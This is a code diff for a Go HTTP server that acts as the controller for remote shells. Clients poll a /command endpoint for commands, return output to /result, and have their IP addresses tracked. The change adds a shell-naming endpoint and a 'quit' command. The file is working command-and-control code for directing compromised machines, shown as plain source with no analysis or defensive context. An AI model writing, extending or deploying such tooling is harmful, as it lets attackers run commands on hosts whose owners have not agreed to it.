@@ -9,6 +9,8 @@ import (
 	"strings"
 	"sync"
 	"time"
+
+	"github.com/brianvoe/gofakeit/v6"
 )
 
 type shell struct {
@@ -23,6 +25,14 @@ var shells = make(map[string]*shell)
 var currentShell *shell
 var mutex = &sync.Mutex{}
 
+func shellIDHandler(w http.ResponseWriter, r *http.Request) {
+	gofakeit.Seed(0)
+	noun := gofakeit.Noun()
+	adjective := gofakeit.Adjective()
+
+	fmt.Fprintf(w, "%s_%s", adjective, noun)
+}
+
 func getCommandHandler(w http.ResponseWriter, r *http.Request) {
 	id := r.URL.Query().Get("id")
 
@@ -35,12 +45,17 @@ func getCommandHandler(w http.ResponseWriter, r *http.Request) {
 			ip:      r.RemoteAddr,
 			version: "Unknown",
 		}
-	}
-	shells[id].timestamp = time.Now()
-
-	if currentShell != nil && currentShell.id == id {
-		fmt.Fprint(w, currentShell.command)
-		currentShell.command = ""
+		shells[id].timestamp = time.Now()
+		fmt.Fprint(w, "")
+	} else if currentShell != nil && currentShell.id == id {
+		if currentShell.command == "quit" {
+			fmt.Fprint(w, "quit")
+			delete(shells, id)
+			currentShell = nil
+		} else {
+			fmt.Fprint(w, currentShell.command)
+			currentShell.command = ""
+		}
 	} else {
 		fmt.Fprint(w, "")
 	}
@@ -59,7 +74,7 @@ func postResultHandler(w http.ResponseWriter, r *http.Request) {
 			s.version = strings.TrimSpace(string(body))
 		} else {
 			if currentShell != nil && currentShell.id == id {
-				fmt.Printf("Command output from shell %s:\n%s\n", id, string(body))
+				fmt.Printf("\nCommand output from shell %s:\n%s\n", id, string(body))
 			}
 		}
 		s.timestamp = time.Now()
@@ -131,6 +146,7 @@ func cleanOldShells() {
 }
 
 func main() {
+	http.HandleFunc("/shellID", shellIDHandler)
 	http.HandleFunc("/command", getCommandHandler)
 	http.HandleFunc("/result", postResultHandler)
 
